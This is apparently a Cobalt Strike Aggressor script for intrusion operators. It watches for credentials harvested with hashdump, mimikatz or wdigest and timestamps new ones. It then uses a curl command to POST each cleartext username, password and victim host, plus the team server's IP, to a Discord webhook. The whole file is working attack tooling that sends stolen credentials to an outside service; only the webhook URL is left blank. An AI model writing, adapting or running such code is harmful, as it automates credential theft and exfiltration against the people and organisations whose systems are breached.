global('@credential_dedupe');

sub notifyDiscord {

    # Credential information
	$user		= $1;
	$password	= $2;
	$source		= $3;
	$timestamp	= $4;
	$host		= $5;

	$username 	= mynick(); # This is the name of the bot
	$teamserver	= localip(); # This is the IP of the teamserver
	$notifyWho	= '<@&806626405604655146>'; # This is the role ID of the role you want to notify
	$webhookURL	= ''; # This is the webhook URL of the channel you want to notify
	

	# println($user);
	# println($password);
	# println($source);
	# println($timestamp);
	# println($host);

	# Build our curl command
    $msg = "New creds on " . "`" .$teamserver . "` for `" . $host . "`";
	@curl_command = @('curl','-X','POST','-H','Content-Type: application/json','--data','{"username": "' . $username . '","embeds": [{"fields":[{"name": "Notify","value": "' . $notifyWho . '","inline": true},{"name": "Teamserver","value": "'. $teamserver .'","inline": true},{"name": "Timestamp","value": "'. $timestamp .'","inline": true},{"name": "Message","value": "' . $msg . '"},{"name": "Credentials","value": "'.$user . " : " . $password . " @ " . $host.'"}]}]}',$webhookURL);

	# println(@curl_command);

	exec(@curl_command); # Execute the curl command	

}

sub credentialNotify {
	local('$user $password $host $realm $source $pwtimestamp $onload');
	$onload = "False";
	if ($1 eq "initial") {
		$onload = "True";
	}
	foreach $key => $value (credentials()) {
		$user = $value['user'];
		$password = $value['password'];
		$host = $value['host'];
		$realm = $value['realm'];
		$source = $value['source'];
		$pwtimestamp = formatDate('MM/dd/yyyy HH:mm:ss (z)');
		$cred_hash = "$user\t$password\t$host\t$realm";
		if ($cred_hash !in @credential_dedupe) {
			if (($source eq 'hashdump') || ($source eq 'mimikatz') || ($source eq 'wdigest')) {
				if ($onload eq "True") {
					add(@credential_dedupe,$cred_hash);
				}
				else {
					add(@credential_dedupe,$cred_hash);
					credential_add("$user","$password","$realm","$source - $pwtimestamp","$host");
					notifyDiscord($user, $password, $source, $timestamp, $host);
				}
			}
		}
	}
}

#on scriptload, marks all existing credentials with source of mimikatz or hashdump with "no timestamp"
credentialNotify("initial");

#on credentials, labels new creds with timestamp
on credentials {
	credentialNotify();
}